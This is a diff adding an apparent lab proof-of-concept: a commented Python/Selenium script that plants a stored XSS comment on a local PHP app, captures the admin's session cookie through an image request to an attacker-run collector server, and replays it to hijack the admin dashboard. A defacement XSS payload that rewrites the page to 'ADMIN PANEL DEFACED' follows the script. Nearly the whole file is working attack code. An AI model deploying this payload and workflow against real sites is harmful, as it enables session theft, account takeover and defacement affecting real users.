@@ -1,0 +1,139 @@
+#!/usr/bin/env python3  # Shebang: run with Python 3 interpreter
+ 
+import threading  # For running cookie collector server in background thread
+import http.server  # To create simple HTTP server that receives stolen cookies
+import socketserver  # To handle TCP socket binding and server lifecycle
+import time  # To add small delays for timing reliability (e.g., server startup)
+import sys  # To exit script on critical errors
+import os  # To interact with file system (e.g., locate comments.txt)
+from urllib.parse import urlparse, parse_qs  # To parse URL and query parameters from exfiltrated cookie
+from selenium import webdriver  # To automate real browser actions (login, post comment)
+from selenium.webdriver.chrome.options import Options  # To configure Chrome driver (e.g., headless mode)
+from selenium.webdriver.common.by import By  # To locate elements (e.g., by name or CSS selector)
+from selenium.webdriver.support.ui import WebDriverWait  # To wait for page transitions (e.g., post-login redirect)
+from selenium.webdriver.support import expected_conditions as EC  # To define wait conditions (e.g., URL contains string)
+import requests  # To send HTTP requests using stolen session cookie
+ 
+# === CONFIGURATION ===  # Section: global settings
+TARGET_URL = "http://localhost:8091"  # URL where vulnerable PHP app is running
+COLLECTOR_PORT = 8890  # Local port for attacker-controlled cookie exfiltration server
+ 
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # Get absolute path of this script's directory
+COMMENTS_PATH = os.path.join(SCRIPT_DIR, "comments.txt")  # Full path to comments.txt used by PHP app
+ 
+# ✅ FIXED PAYLOAD: silent exfiltration, no redirect, no Base64  # XSS payload that steals cookie without alerting victim
+XSS_PAYLOAD = f'''<script>new Image().src="http://localhost:{COLLECTOR_PORT}/?cookie="+encodeURIComponent(document.cookie);</script>'''  # Injects script that sends cookie via invisible image request
+ 
+stolen_cookie = None  # Global variable to store exfiltrated session cookie
+ 
+# === COOKIE COLLECTOR SERVER ===  # Section: HTTP server that captures stolen cookies
+class CookieHandler(http.server.BaseHTTPRequestHandler):  # Custom HTTP request handler for cookie exfiltration
+    def do_GET(self):  # Handle incoming GET requests (from XSS payload)
+        global stolen_cookie  # Allow modification of global variable
+        query = urlparse(self.path).query  # Extract query string from URL (e.g., "cookie=...")
+        params = parse_qs(query)  # Parse query into dictionary (e.g., {'cookie': ['value']})
+        if 'cookie' in params:  # If cookie parameter exists in request
+            # ✅ FIXED: NO Base64 — just use raw URL-decoded value  # Use directly since parse_qs auto-decodes
+            stolen_cookie = params['cookie'][0]  # Save first value of 'cookie' param as stolen session
+            self.send_response(204)  # Respond with "No Content" (success, no body)
+        else:  # If 'cookie' param missing
+            self.send_response(400)  # Respond with "Bad Request"
+        self.end_headers()  # Finalize HTTP response headers
+ 
+    def log_message(self, format, *args):  # Override default logging
+        return  # Suppress HTTP access logs to keep output clean
+ 
+def start_collector():  # Function to launch cookie collector server
+    with socketserver.TCPServer(("localhost", COLLECTOR_PORT), CookieHandler) as httpd:  # Bind server to localhost:8890
+        httpd.serve_forever()  # Run server indefinitely
+ 
+# === MAIN ATTACK WORKFLOW ===  # Section: orchestrate full exploit chain
+def main():  # Entry point of attack logic
+    global stolen_cookie  # Allow access to global stolen cookie variable
+ 
+    try:  # Check if target app is reachable
+        requests.get(TARGET_URL, timeout=3)  # Send test request to target URL
+    except:  # If connection fails
+        print(f"[-] Start PHP server: php -S localhost:8091 -t {SCRIPT_DIR}")  # Instruct user to start dev server
+        sys.exit(1)  # Exit with error
+ 
+    if os.path.exists(COMMENTS_PATH):  # If comments file exists
+        open(COMMENTS_PATH, "w").close()  # Truncate it to ensure clean state
+ 
+    threading.Thread(target=start_collector, daemon=True).start()  # Start cookie collector in background
+    time.sleep(1)  # Wait for server to bind to port
+ 
+    chrome_options = Options()  # Initialize Chrome options
+    #chrome_options.add_argument("--headless=new")  # Run browser without GUI (invisible)
+    chrome_options.add_argument("--no-sandbox")  # Bypass OS sandbox (needed in some envs)
+    chrome_options.add_argument("--disable-dev-shm-usage")  # Avoid memory issues in containers
+    chrome_options.add_argument("--disable-gpu")  # Disable GPU (not needed in headless)
+    chrome_options.add_argument("--window-size=1920,1080")  # Set consistent viewport size
+ 
+    # === PHASE 1: ALICE POSTS MALICIOUS COMMENT ===  # Simulate low-priv user injecting XSS
+    print("[*] Alice posting XSS payload...")  # Log current phase
+    driver = webdriver.Chrome(options=chrome_options)  # Launch headless Chrome
+    try:  # Ensure browser closes even if error occurs
+        driver.get(f"{TARGET_URL}/login.php")  # Navigate to login page
+        driver.find_element(By.NAME, "user").send_keys("alice")  # Enter username "alice"
+        driver.find_element(By.NAME, "pass").send_keys("alice123")  # Enter password "alice123"
+        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()  # Submit login form
+        WebDriverWait(driver, 10).until(EC.url_contains("index.php"))  # Wait until redirected to user page
+        driver.find_element(By.NAME, "comment").send_keys(XSS_PAYLOAD)  # Type XSS payload into comment box
+        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()  # Submit comment
+        time.sleep(1)  # Allow time for comment to be saved
+    finally:  # Always execute
+        driver.quit()  # Close browser
+ 
+    # === PHASE 2: ADMIN VISITS PAGE & TRIGGERS XSS ===  # Simulate admin triggering stored XSS
+    print("[*] Admin logging in and triggering XSS...")  # Log current phase
+    driver = webdriver.Chrome(options=chrome_options)  # Launch new browser instance
+    try:  # Ensure cleanup
+        driver.get(f"{TARGET_URL}/login.php")  # Go to login
+        driver.find_element(By.NAME, "user").send_keys("admin")  # Enter admin username
+        driver.find_element(By.NAME, "pass").send_keys("admin123")  # Enter admin password
+        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()  # Login
+        WebDriverWait(driver, 10).until(EC.url_contains("admin.php"))  # Wait for admin dashboard load
+        print("[+] Admin loaded admin.php — XSS fired")  # Confirm XSS execution context
+        time.sleep(3)  # Allow time for cookie exfiltration to complete
+    finally:  # Always
+        driver.quit()  # Close browser
+ 
+    # === PHASE 3: USE STOLEN COOKIE TO HIJACK SESSION ===  # Use stolen cookie to impersonate admin
+    if not stolen_cookie:  # If no cookie was captured
+        print("[-] Failed to steal cookie. Ensure session.cookie_httponly=0 in PHP config.")  # Debug hint
+        sys.exit(1)  # Abort
+ 
+    print(f"\n[+] Stolen cookie: {stolen_cookie}")  # Show exfiltrated cookie
+ 
+    cookies = {}  # Prepare cookie dict for requests
+    for part in stolen_cookie.split(";"):  # Split cookie string by semicolons
+        part = part.strip()  # Remove whitespace
+        if "=" in part and not part.lower().startswith(("path", "httponly", "secure", "samesite", "domain")):  # Skip non-name/value parts
+            k, v = part.split("=", 1)  # Split into key and value
+            cookies[k] = v  # Add to cookie dict
+ 
+    resp = requests.get(f"{TARGET_URL}/admin.php", cookies=cookies)  # Access admin page using stolen session
+    if resp.status_code == 200 and "Admin Dashboard" in resp.text:  # If access successful
+        print("\n✅ SUCCESS: Full session hijacking completed!")  # Celebrate victory
+        print("\n📄 Admin Dashboard HTML (first 800 chars):")  # Show proof
+        print(resp.text[:800] + ("..." if len(resp.text) > 800 else ""))  # Truncate long output
+    else:  # If access failed
+        print("\n[?] Unexpected response")  # Indicate anomaly
+        print("Status:", resp.status_code)  # Show HTTP status
+        print("Preview:", resp.text[:300])  # Show snippet of response
+ 
+if __name__ == "__main__":  # If script run directly (not imported)
+    main()  # Execute main attack workflow
+
+
+
+
+
+
+
+
+
+
+
+<script>document.body.innerHTML='<div style="text-align:center;margin-top:60px;"><img src="image.jpeg" style="max-width:80%;box-shadow:0 0 25px red;"><h1 style="color:red;font-size:48px;">ADMIN PANEL DEFACED</h1><p style="font-size:20px;">Stored XSS Proof of Concept</p></div>';</script>
